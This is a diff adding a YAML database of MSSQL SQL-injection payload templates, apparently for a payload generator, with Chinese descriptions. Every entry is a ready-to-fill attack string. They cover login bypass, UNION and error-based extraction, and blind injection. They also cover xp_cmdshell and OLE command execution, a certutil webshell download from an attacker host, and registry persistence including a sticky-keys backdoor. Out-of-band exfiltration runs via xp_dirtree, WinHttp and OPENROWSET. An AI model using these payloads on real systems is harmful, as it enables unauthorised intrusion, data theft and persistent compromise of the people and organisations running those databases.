@@ -1,0 +1,610 @@
+ruleDB: v0.1.0
+# MSSQL / SQL Server 注入模板。
+#
+# 注意 content_type 的口径（见方案 §3）：它描述**载荷文本是用什么语法写的**，
+# 不是「载荷最终达成什么效果」。所以 `xp_cmdshell` 这条虽然效果是执行系统命令，
+# 载荷本身仍是 T-SQL，content_type 就是 sql-expression。效果写在 requires / desc 里。
+
+templates:
+  # ---- 探测 ----
+
+  - id: sqli.mssql.detect.version
+    name: MSSQL 版本回显
+    desc: 联合查询回显数据库版本
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      expr:    {options: ["@@version", "db_name()", "user_name()"], default: "@@version"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 联合查询 ----
+
+  - id: sqli.mssql.union.basic
+    name: MSSQL UNION 联合查询
+    desc: 基础联合查询，需要已知列数
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mssql.union.marker
+    name: MSSQL UNION 回显位标记
+    desc: 在回显位放固定标记，用来定位页面上的回显点
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      marker:  {options: ["0x41", "'ab'", "'a b'"], default: "0x41"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,marker)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mssql.union.tables
+    name: MSSQL UNION 读表名
+    desc: 从 information_schema 读表名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+      expr:    {options: ["table_name", "string_agg(table_name,',')"], default: "table_name"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.tables <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 报错注入 ----
+
+  - id: sqli.mssql.error.convert
+    name: MSSQL CONVERT 报错注入
+    desc: 把表达式转成 int 触发类型转换报错，报错信息里带出值
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND 1=CONVERT(int,(<<expr>>)) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 盲注 ----
+
+  - id: sqli.mssql.bool.blind
+    name: MSSQL 布尔盲注
+    desc: 页面在条件为真/假时返回的内容不同时用；完全看不出差异就只能走时间盲注，用 WAITFOR 那条
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND (<<cond>>) <<comment>>"
+    vars: [cond]
+    requires: [boolean]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.time.waitfor
+    name: MSSQL 时间盲注 WAITFOR
+    desc: 用 WAITFOR DELAY 制造延时，需要堆叠查询
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+      secs:  {options: ["3", "5", "10"], default: "5"}
+    body: "<<close>>; IF (<<cond>>) WAITFOR DELAY '0:0:<<secs>>'--"
+    vars: [cond]
+    requires: [stacked]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 命令执行 ----
+  # 这两条的载荷文本仍是 T-SQL（所以 content_type 是 sql-expression），
+  # 但效果是执行系统命令。`<<cmd>>` 里放什么，就是什么内容类型的载荷。
+
+  - id: sqli.mssql.xp_cmdshell.enable
+    name: MSSQL 启用 xp_cmdshell
+    desc: xp_cmdshell 默认关闭，执行前需要先启用
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--"
+    vars: []
+    requires: [stacked, dba]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mssql.xp_cmdshell.exec
+    name: MSSQL xp_cmdshell 命令执行
+    desc: 载荷是 T-SQL，效果是执行 `<<cmd>>` 里的系统命令
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; EXEC xp_cmdshell '<<cmd>>'--"
+    vars: [cmd]
+    requires: [stacked, weak-hardening, dba]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mssql.xp_cmdshell.blind
+    name: MSSQL xp_cmdshell 无回显盲执行
+    desc: 结果不直接回显时，把输出写到 Web 目录再访问
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; EXEC xp_cmdshell '<<cmd>> > <<filepath>>'--"
+    vars: [cmd, filepath]
+    requires: [stacked, weak-hardening, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 带外 ----
+
+  - id: sqli.mssql.oob.dirtree
+    name: MSSQL xp_dirtree 带外
+    desc: 触发 UNC 请求把域名解析打到外部 DNS，用于无回显场景
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; EXEC master..xp_dirtree '\\\\<<lhost>>\\<<share>>'--"
+    vars: [lhost, share]
+    requires: [stacked, outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mssql.oob.openrowset
+    name: MSSQL OPENROWSET 带外
+    desc: 用 OPENROWSET 发起外部数据库连接
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT * FROM OPENROWSET('SQLOLEDB','<<lhost>>';'a';'a','SELECT 1') <<comment>>"
+    vars: [lhost]
+    requires: [outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 认证绕过 ----
+
+  - id: sqli.mssql.auth.bypass
+    name: MSSQL 登录绕过
+    desc: 永真条件绕过登录。闭合符按注入点上下文选
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> OR 1=1<<comment>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.auth.bypass.admin
+    name: MSSQL 指定用户登录绕过
+    desc: 已知用户名时的绕过。用户名默认 admin，按目标实际账号改
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      username: {options: ["admin", "administrator", "root", "sa", "test", "guest"],
+                 default: "admin"}
+      close:    {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment:  {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<username>><<close>> <<comment>>"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 信息收集 ----
+
+  - id: sqli.mssql.union.databases
+    name: MSSQL 读库名
+    desc: 读 sys.databases 需要权限，够不着就退回 information_schema.schemata（那条的列名是 schema_name，记得一起换）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      # 表名与列名是配套的，但拆成两个槽位会允许 user 拼出
+      # 「schemata + name」这种不存在的组合——所以合并成一个字典槽位，
+      # 一次选好一对。string_agg 要 2017 以上。
+      src:
+        options:
+          - {id: sysdb,  name: "sys.databases",         tbl: "sys.databases",             col: "name"}
+          - {id: sysdb_agg, name: "sys.databases（拼成一行）", tbl: "sys.databases",        col: "string_agg(name,',')"}
+          - {id: schema, name: "information_schema.schemata", tbl: "information_schema.schemata", col: "schema_name"}
+        default: sysdb
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,src.col)>> FROM <<src.tbl>> <<comment>>"
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.union.columns
+    name: MSSQL 读列名
+    desc: 已知表名后读它的列名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["column_name", "string_agg(column_name,',')"], default: "column_name"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.columns WHERE table_name='<<table>>' <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.union.forxml
+    name: MSSQL FOR XML PATH 拼多行
+    desc: 没有 string_agg（2017 以前）时，用 FOR XML PATH('') 把整列拼成一个字符串——MSSQL 里最通用的一条
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      sep:    {options: ["'|'", "','", "'~'"], default: "'|'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    # 第三个参数里有逗号吗？没有——只有括号，所以 <<select>> 的括号配对扫描不会切坏。
+    body: "<<close>> UNION SELECT <<select(cols,pos,(SELECT CAST(<<col>> AS NVARCHAR(MAX))+<<sep>> FROM <<table>> FOR XML PATH('')))>> <<comment>>"
+    vars: [col, table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.detect.priv
+    name: MSSQL 当前权限探测
+    desc: xp_cmdshell 能不能用，先看自己在不在 sysadmin 角色里
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["system_user", "is_srvrolemember('sysadmin')", "user_name()",
+                         "IS_MEMBER('db_owner')"],
+               default: "is_srvrolemember('sysadmin')"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> <<comment>>"
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 文件读写 ----
+
+  - id: sqli.mssql.file.read
+    name: MSSQL OPENROWSET 读文件
+    desc: 把文件当 BULK 数据源读进来，需要 sysadmin 或 bulkadmin
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      as_:   {options: ["SINGLE_CLOB", "SINGLE_NCLOB", "SINGLE_BLOB"], default: "SINGLE_CLOB"}
+    body: "<<close>>; SELECT * FROM OPENROWSET(BULK '<<filepath>>', <<as_>>) AS x--"
+    vars: [filepath]
+    requires: [stacked, dba]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.file.write.download
+    name: MSSQL 下载 webshell 落地
+    desc: 比起用 echo 拼文件（cmd 下 < > 还要转义），让目标自己下载更省事。走 xp_cmdshell，所以是系统命令不是 SQL 函数
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; EXEC xp_cmdshell 'certutil -urlcache -f http://<<lhost>>/<<file>> <<filepath>>'--"
+    vars: [lhost, file, filepath]
+    requires: [stacked, weak-hardening, outbound, listener, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 堆叠 ----
+
+  - id: sqli.mssql.stacked.insert
+    name: MSSQL 堆叠插入数据
+    desc: 直接改库，CTF 里常用来插一个管理员账号
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; INSERT INTO <<table>> (<<fields>>) VALUES (<<values>>)--"
+    vars: [table, fields, values]
+    requires: [stacked]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入的其他写法 ----
+
+  - id: sqli.mssql.error.cast
+    name: MSSQL 类型转换报错注入（CAST / 算术）
+    desc: CONVERT 显式转换被关键字规则拦掉时换它。CAST 是同义写法，算术 +1 则靠隐式转换触发——几条路报出来的是同一类「将 nvarchar 值转换成 int 时失败」，值就在报错里。页面必须回显报错。注意值是**纯数字**时转换不会失败、也就没有报错可看，这种目标要换 FOR XML 那条或先拼个非数字前缀
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      # 几种写法都是「把表达式塞进一次注定失败的转换」，差别只在关键字长什么样。
+      # 值里嵌的是变量 <<expr>>——槽位先填、变量后替换，所以这样写是通的（规范 §4）
+      conv:
+        options:
+          - {id: cast,  name: "CAST(... AS int)",       wrap: "CAST((<<expr>>) AS int)"}
+          - {id: conv,  name: "CONVERT(int, ...)",      wrap: "CONVERT(int,(<<expr>>))"}
+          - {id: plus,  name: "算术 +1（隐式转换）",     wrap: "((<<expr>>)+1)"}
+          - {id: dt,    name: "CAST(... AS datetime)",  wrap: "CAST((<<expr>>) AS datetime)"}
+        default: cast
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> AND 1=<<conv.wrap>> <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.error.forxml
+    name: MSSQL FOR XML 聚合后报错带出
+    desc: 报错注入一次只带得回一行时用它——先用 FOR XML PATH('') 把整列拼成一个串再交给转换报错，一次拿到全部库名/表名/列名，比逐行猜省几十个请求。sys.* 只列出当前账号够得着的对象
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      sep:     {options: ["','", "'|'", "'~'"], default: "','"}
+      # 表名和列名是配套的：拆成两个槽位会允许拼出 sys.tables + column_name 这种不存在的组合
+      src:
+        options:
+          - {id: sysdb,   name: "所有库名（sys.databases）",  tbl: "sys.databases",              col: "name"}
+          - {id: systbl,  name: "所有表名（sys.tables）",     tbl: "sys.tables",                 col: "name"}
+          - {id: syscol,  name: "所有列名（sys.columns）",    tbl: "sys.columns",                col: "name"}
+          - {id: infocol, name: "列名（information_schema）", tbl: "information_schema.columns", col: "column_name"}
+        default: sysdb
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    # 外面那层 (SELECT ...) 不是多余的：FOR XML 不能直接当 CONVERT 的参数
+    body: "<<close>> AND 1=CONVERT(int,(SELECT (SELECT CAST(<<src.col>> AS NVARCHAR(MAX))+<<sep>> FROM <<src.tbl>> FOR XML PATH('')))) <<comment>>"
+    vars: []
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 命令执行：xp_cmdshell 之外的几条路 ----
+  # oacreate.exec / regwrite 的载荷文本仍是 T-SQL，效果是执行系统命令或落地持久化
+  # （content_type 按语法归档）；makewebtask 走文件，oob.* 走带外。
+
+  - id: sqli.mssql.oacreate.exec
+    name: MSSQL OLE 自动化命令执行
+    desc: xp_cmdshell 被删掉、或策略禁止启用它时的主力。sp_OACreate 拉起 WScript.Shell 再 Run 命令——注意**命令没有回显**，要结果就重定向到文件（`> C:\path`）再用文件读那条，或者配合带外。要 sysadmin 且 Ole Automation Procedures 得是开的
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'<<cmd>>',0,1; EXEC sp_OADestroy @o--"
+    vars: [cmd]
+    requires: [stacked, dba, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.regwrite
+    name: MSSQL 写注册表启动项
+    desc: 不用 xp_cmdshell 也能落地：把命令写进注册表，等目标**下次登录或触发**时执行——不是立即执行，这是它和 xp_cmdshell 最大的区别。只要求 sysadmin，不要求任何可开关的配置项。三档都是经典落点：Run 键最直白，IFEO 的 Debugger 值拿粘滞键（sethc.exe）当触发器，不需要重启
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      # 键路径与被写的值名是配套的（换成 IFEO 时值名必须是 Debugger），
+      # 拆成两个槽位会允许拼出「Run 键 + Debugger」这种不生效的组合
+      reg:
+        options:
+          - {id: run,     name: "HKLM Run 键（登录时执行）",    hive: "HKEY_LOCAL_MACHINE", path: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",                                                                        vname: "Updater"}
+          - {id: ifeo,    name: "IFEO Debugger（粘滞键后门）", hive: "HKEY_LOCAL_MACHINE", path: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",                                  vname: "Debugger"}
+          - {id: userrun, name: "HKCU Run 键",                hive: "HKEY_CURRENT_USER",  path: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",                                                                        vname: "Updater"}
+        default: run
+    body: "<<close>>; EXEC xp_regwrite '<<reg.hive>>','<<reg.path>>','<<reg.vname>>','REG_SZ','<<cmd>>'--"
+    vars: [cmd]
+    requires: [stacked, dba, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.regread
+    name: MSSQL 读注册表
+    desc: 摸目标机器：装了什么、服务用什么账号跑、装了哪家的 EDR。结果由扩展存储过程自己作为结果集返回——很多框架只渲染第一个结果集，页面看不到就得先 INSERT 进临时表再 SELECT。要 sysadmin 且目标为 Windows
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','<<key>>','<<name>>'--"
+    vars: [key, name]
+    requires: [stacked, dba, os-windows]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.makewebtask
+    name: MSSQL sp_makewebtask 导出文件
+    desc: 把一条查询的**结果**生成 HTML 文件落到指定路径，不用 xp_cmdshell 也不用 OLE 自动化。注意它产出的是查询结果的 HTML 报表，**不是任意内容**——别指望它落一个能执行的 webshell，它的用处是外发数据（写 UNC 路径）或往 Web 目录落一份可读的结果。只在 SQL Server 7.0/2000 上有，2005 起标记废弃、2008 已移除，且数据库兼容级别 ≥100 时也用不了
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: "<=2005"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; EXEC sp_makewebtask '<<filepath>>','<<stmt>>'--"
+    vars: [filepath, stmt]
+    requires: [stacked, dba, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 带外：换一条出网协议 ----
+
+  - id: sqli.mssql.oob.http
+    name: MSSQL HTTP 带外
+    desc: SMB（xp_dirtree 的 UNC）出不去、只剩 HTTP 能出网时用它。用 OLE 调 WinHttp 发请求，数据拼在 URL 里——比 xp_dirtree 多一个好处：查询结果能直接进 URL，不必先落到文件。同样要 Ole Automation Procedures 打开
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2000"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    # 字符串拼接写在 +(...) 上：<<expr>> 要是一个求值成字符串的表达式（常见是子查询）
+    body: "<<close>>; DECLARE @o INT; EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1',@o OUT; EXEC sp_OAMethod @o,'open',NULL,'GET','http://<<lhost>>/'+(<<expr>>),0; EXEC sp_OAMethod @o,'send'; EXEC sp_OADestroy @o--"
+    vars: [lhost, expr]
+    requires: [stacked, dba, outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mssql.oob.openrowset.pull
+    name: MSSQL OPENROWSET 拉取远程数据
+    desc: 与 oob.openrowset 那条分工不同——那条把远程查询写死成 SELECT 1，只用来确认能不能外连；这条把远程查询做成变量，把你伪造服务端返回的结果当普通行集拉回来，无回显也能读到数据。列数要和伪造服务端返回的列数对上，且目标开了 Ad Hoc Distributed Queries（默认关）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mssql]
+    version: ">=2005"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "-- -", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT * FROM OPENROWSET('SQLOLEDB','<<lhost>>';'a';'a','<<stmt>>') <<comment>>"
+    vars: [lhost, stmt]
+    requires: [outbound, listener, weak-hardening, echo]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
